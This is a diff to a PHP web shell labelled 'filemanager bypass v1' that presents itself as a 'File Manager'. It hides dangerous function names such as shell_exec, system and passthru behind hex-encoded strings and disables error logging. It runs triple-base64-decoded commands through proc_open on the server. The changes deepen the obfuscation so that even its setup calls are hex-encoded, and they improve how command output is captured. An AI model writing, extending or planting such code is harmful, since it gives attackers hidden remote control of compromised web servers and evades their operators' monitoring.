@@ -3,16 +3,22 @@
 filemanager bypass v1
 author: z_one
 */
-session_start();
-error_reporting(0);
-set_time_limit(0);
-@clearstatcache();
-@ini_set('error_log', null);
-@ini_set('log_errors', 0);
-@ini_set('max_execution_time', 0);
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-$h2b = chr(104).chr(101).chr(120).chr(50).chr(98).chr(105).chr(110); $a = $h2b("6d6435"); $b = $h2b("686561646572"); $c = $h2b("696e695f736574"); $d = $h2b("626173656e616d65"); $e = $h2b("676574637764"); $f = $h2b("6469736b5f667265655f7370616365"); $g = $h2b("6469736b5f746f74616c5f7370616365"); $h = $h2b("70687076657273696f6e"); $i = $h2b("696e695f676574"); $j = $h2b("7368656c6c5f65786563"); $k = $h2b("65786563"); $l = $h2b("73797374656d"); $m = $h2b("7061737374687275"); $n = $h2b("7374725f7265706c616365"); $o = $h2b("66696c655f657869737473"); $p = $h2b("69735f646972"); $q = $h2b("6d6b646972"); $r = $h2b("726d646972"); $s = $h2b("756e6c696e6b"); $t = $h2b("636f7079"); $u = $h2b("72656e616d65"); $v = $h2b("63686d6f64"); $w = $h2b("6f6374646563"); $x = $h2b("7363616e646972"); $y = $h2b("66696c6573697a65"); $z = $h2b("66696c656d74696d65"); $aa = $h2b("737472746f74696d65"); $ab = $h2b("64617465"); $ac = $h2b("746f756368"); $ad = $h2b("66696c655f7075745f636f6e74656e7473"); $ae = $h2b("66696c655f6765745f636f6e74656e7473"); $af = $h2b("66696c657065726d73"); $b64d = $h2b("6261736536345f6465636f6465");
+$h2b = chr(104).chr(101).chr(120).chr(50).chr(98).chr(105).chr(110);
+$ss = $h2b("73657373696f6e5f7374617274");
+$er = $h2b("6572726f725f7265706f7274696e67");
+$st = $h2b("7365745f74696d655f6c696d6974");
+$cs = $h2b("636c656172737461746361636865");
+$is = $h2b("696e695f736574");
+$ss();
+$er(0);
+$st(0);
+@$cs();
+@$is($h2b("6572726f725f6c6f67"), null);
+@$is($h2b("6c6f675f6572726f7273"), 0);
+@$is($h2b("6d61785f657865637574696f6e5f74696d65"), 0);
+@$is($h2b("6f75747075745f627566666572696e67"), 0);
+@$is($h2b("646973706c61795f6572726f7273"), 0);
+$a = $h2b("6d6435"); $b = $h2b("686561646572"); $c = $h2b("696e695f736574"); $d = $h2b("626173656e616d65"); $e = $h2b("676574637764"); $f = $h2b("6469736b5f667265655f7370616365"); $g = $h2b("6469736b5f746f74616c5f7370616365"); $h = $h2b("70687076657273696f6e"); $i = $h2b("696e695f676574"); $j = $h2b("7368656c6c5f65786563"); $k = $h2b("65786563"); $l = $h2b("73797374656d"); $m = $h2b("7061737374687275"); $n = $h2b("7374725f7265706c616365"); $o = $h2b("66696c655f657869737473"); $p = $h2b("69735f646972"); $q = $h2b("6d6b646972"); $r = $h2b("726d646972"); $s = $h2b("756e6c696e6b"); $t = $h2b("636f7079"); $u = $h2b("72656e616d65"); $v = $h2b("63686d6f64"); $w = $h2b("6f6374646563"); $x = $h2b("7363616e646972"); $y = $h2b("66696c6573697a65"); $z = $h2b("66696c656d74696d65"); $aa = $h2b("737472746f74696d65"); $ab = $h2b("64617465"); $ac = $h2b("746f756368"); $ad = $h2b("66696c655f7075745f636f6e74656e7473"); $ae = $h2b("66696c655f6765745f636f6e74656e7473"); $af = $h2b("66696c657065726d73"); $b64d = $h2b("6261736536345f6465636f6465");
 $APP_NAME = "File Manager";
 $x5 = "a84e5f25e7f6d5de9b82ce3f64d1b8fa";
 if(isset($_POST['login'])){
@@ -73,23 +79,44 @@ function deleteDirectory($dir) {
 function ekse($coman, $serlok) {
     global $b64d;
     if (!function_exists("proc_open")) {
-        echo "proc_open function disabled !";
+        echo "proc_open disabled!";
         return;
     }
     $komen = $b64d($b64d($b64d($coman)));
-    $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r"));
+    // gabungkan stderr ke stdout
+    $komen .= " 2>&1";
+    $descriptorspec = array(
+        0 => array("pipe", "r"),
+        1 => array("pipe", "w")
+    );
     $process = @proc_open($komen, $descriptorspec, $pipes, $serlok);
-    if (is_resource($process)) {
-        $output = stream_get_contents($pipes[1]);
-        $error = stream_get_contents($pipes[2]);
-        fclose($pipes[0]);
-        fclose($pipes[1]);
-        fclose($pipes[2]);
-        proc_close($process);
-        echo "<textarea rows='25' readonly='' style='width:100%; background:#1a1a1a00; color:#00ffbf; border:1px solid #1a1a1a00; border-radius:6px; padding:12px; font-family:monospace;'>" . htmlspecialchars($output . $error) . "</textarea>";
-    } else {
-        echo "Failed to execute command";
+    if (!is_resource($process)) {
+        echo "Failed execute";
+        return;
     }
+    fclose($pipes[0]);
+    stream_set_blocking($pipes[1], false);
+    $output = '';
+    while (true) {
+        $status = proc_get_status($process);
+        $output .= stream_get_contents($pipes[1]);
+        if (!$status['running']) {
+            break;
+        }
+        usleep(100000);
+    }
+    $output .= stream_get_contents($pipes[1]);
+    fclose($pipes[1]);
+    proc_close($process);
+    echo '<textarea rows="25" readonly style="
+        width:100%;
+        background:#1a1a1a00;
+        color:#00ffbf;
+        border:1px solid #1a1a1a00;
+        border-radius:6px;
+        padding:12px;
+        font-family:monospace;
+    ">'.htmlspecialchars($output).'</textarea>';
 }
 $BASE_PATH = $e();
 $path = isset($_GET['path']) ? $_GET['path'] : $BASE_PATH;
